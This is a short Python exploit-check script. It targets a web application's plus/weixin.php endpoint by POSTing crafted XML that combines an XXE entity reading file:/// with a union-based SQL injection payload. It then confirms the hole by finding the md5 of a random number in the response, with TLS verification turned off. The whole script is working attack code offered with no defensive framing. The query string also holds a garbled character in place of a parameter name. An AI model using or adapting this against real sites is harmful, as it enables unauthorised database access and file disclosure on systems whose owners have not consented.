import requests, re, urllib3
from hashlib import md5

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def randomInt(s, e):
    import random
    key = random.randint(int(s), int(e))
    return key


rand = randomInt(200000000, 210000000)


def doCheck(url):
    if url[-1] != "/":
        url = url + "/"
    targetUrl = url + "plus/weixin.php?signature=da39a3ee5e6b4b0d3255bfef95601890afd80709\xc3\x97tamp=&nonce="
    body = '<?xml version="1.0" encoding="utf-8"?><!DOCTYPE copyright [<!ENTITY test SYSTEM "file:///">]><xml><ToUserName>&test;</ToUserName><FromUserName>1111</FromUserName><MsgType>123</MsgType><FuncFlag>3</FuncFlag><Content>1%\' union select md5(' + str(
        rand) + ')#</Content></xml>'
    headers = {'Content-Type': 'text/xml'}
    response = requests.post(targetUrl, body, headers=headers, timeout=5, verify=False)
    if md5(str(rand).encode()).hexdigest() in response.text:
        return targetUrl
    else:
        return False

